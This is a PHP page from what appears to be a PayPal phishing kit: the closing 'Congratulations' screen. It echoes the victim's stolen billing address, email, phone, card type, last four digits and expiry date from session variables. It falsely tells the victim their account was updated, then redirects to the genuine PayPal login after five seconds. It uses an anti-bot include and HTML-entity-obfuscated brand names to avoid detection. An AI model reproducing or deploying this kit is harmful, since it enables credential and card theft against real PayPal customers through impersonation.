<?php



session_start();
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
date_default_timezone_set('GMT'); 
include('../config.php');
include('../antibots.php');
$icon_card = "pp.png";
if(isset($_SESSION['_c_type_'] )) {
if ( $_SESSION['_c_type_'] == "AMEX") { $icon_card = "ae.png";}
if ( $_SESSION['_c_type_'] == "JCB") { $icon_card = "jc.png";}
if ( $_SESSION['_c_type_'] == "DINERS_CLUB") { $icon_card = "ae.png";}
if ( $_SESSION['_c_type_'] == "DINERS_CLUB_GLOBAL") { $icon_card = "ae.png";}
if ( $_SESSION['_c_type_'] == "VISA") { $icon_card = "v.png";}
if ( $_SESSION['_c_type_'] == "VISA ELECTRON") { $icon_card = "v.png";}
if ( $_SESSION['_c_type_'] == "MASTERCARD") { $icon_card = "mc.png";}
if ( $_SESSION['_c_type_'] == "MAESTRO") { $icon_card = "ms.png";}
if ( $_SESSION['_c_type_'] == "DISCOVER") { $icon_card = "d.png";}
}

?>
<html class=" BowZ118 BowDefaultZ118 js " lang="fr" dir="ltr"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>PayPal Safety & Security</title>
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="icon" type="image/x-icon" href="../../lib/img//pp32.png">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../../lib/css/B-Z118.css">
	<meta http-equiv="refresh" content="5; url=http://www.paypal.com/cgi-bin/webscr?cmd=_login-submit">
	<style>
	.start {
		font-size: 0.8em;
		margin-left: 2%;
	}
	.address {
		color: #656565;
		font-weight:200;
	}
	#msg {
		border: 1px solid #0070ba;
    	font-size: 14px;
    	font-weight: bold;
    	padding-top: 16px;
    	padding-right: 10px;
    	padding-left: 10px;
    	border-radius: 5px;
    	width: 90%;
        margin-right: 4%;
	}
	h4 {
		font-weight: 200;
    	color: #656565;
	}
	.Z118-Icon{
		background-position: left top;
    	background-size: 300px;
    	background-image: url(../../lib/img/superbowlAsset.png);
    	background-repeat: no-repeat;
    	display: inline-block;
    	height: 96px;
    	width: 100px;
	}
	</style>
</head>
<body>
    <header class="mainHeader" role="banner">
        <div class="headerContainer">
            <div class="Grimm12">
                <a data-click="payPalLogo" href="#" class="logo"></a>
                <div class="loginBtn"><span class="securityLock">Your security is our top priority</span></div>
            </div>
        </div>
    </header>
    <main class="BrowMainZ118">
        <section id="content" role="main" data-country="US">
            <section id="main" class="">
                <div id="WorldWide" class="WorldWide Grimm12">
                    <div class="Grimm118">
                        <form action="" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                            <div class="stepProgress"><span>○</span><span>○</span><span>○</span><span class="selected">●</span></div>
                            <div class="HeaderZ118">
                                <h2>Congratulations !</h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;">Dear Customer, your &#80;&#97;&#121;&#80;&#97;&#108; Account has been Successfully updated, you will be redirected automatically to login page in 5 seconds.</p>
                            </div>
                            <div class="BowContainerZ118">
                                <div class="inner" style="margin-left: 4%;">
								<center><span class="Z118-Icon"></span></center>
                                    <p>Billing Address Info</p>
                                    <div class="start">
                                        <p style="text-transform: capitalize;" class="address">
										  <?php echo $_SESSION['_fullName_']; ?>
		                				  <br>
		                				  <?php echo $_SESSION['_address_']; ?>
		                 				  <br>
										  <?php echo $_SESSION['_city_']; ?>
										  <?php echo $_SESSION['_state_']; ?>
										  <?php echo $_SESSION['_zipCode_']; ?>
										  <br>
										  <?php echo $_SESSION['_cntrcode_']; ?>
										</p>
									</div>
									<div class="start">
                                        <p class="address" style="font-weight: 200;">
										    <?php echo $_SESSION['_login_email_']; ?>
                                            <br>
											<?php echo $_SESSION['_phoneNumber_']; ?>
										</p>                                  
                                    </div>
                                    <div class="G-FieldsZ118">
                                        <div class="AddressLine" id="addressEntry">
                                            <p><?php echo $TYPES; ?> Card Information</p>
                                            <center>
                                                <div id="msg">
                                                    <table border="0" width="100%" align="center" style="margin-top: -6px;margin-bottom: -6px;">
                                                        <tbody>
                                                            <tr>
                                                                <td align="center" valign="top" style="">
                                                                    <img src="../../lib/img/icons/<?php echo $icon_card; ?>"></td>
                                                                <td align="center" valign="middle">
                                                                    <h4>XXXX XXXX XXXX <?=substr($_SESSION['_cardnumber_'] , -4);?></h4></td>
                                                                <td align="center" valign="middle">
                                                                    <h4><?php echo $_SESSION['_expdate_']; ?></h4></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </center>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
    </main>
    <footer id="gblFooter" role="contentinfo">
        <div class="footer IntentFooter">
            <div class="footerNav">
                <div class="Grimm12">
                    <div class="legal">
                        <p class="copyright">© <?php echo date('Y') ?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a data-click="privacyPolicy" href="#" target="_blank">Privacy</a></li>
                            <li><a data-click="legalAgreement" href="#" target="_blank">Legal</a></li>
                            <li><a data-click="contactUs" href="#" target="_blank">Help Center</a></li>
                            <li class="siteFeedback" id="siteFeedback"></li>
                        </ul>
						<div class="flag countryFlag">
						<a data-click="flagChange" href="javascript:void(0)" id="countryFlag" class="country <?php echo $_SESSION['_countrycode_']; ?>">countryFlag</a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</body>
</html>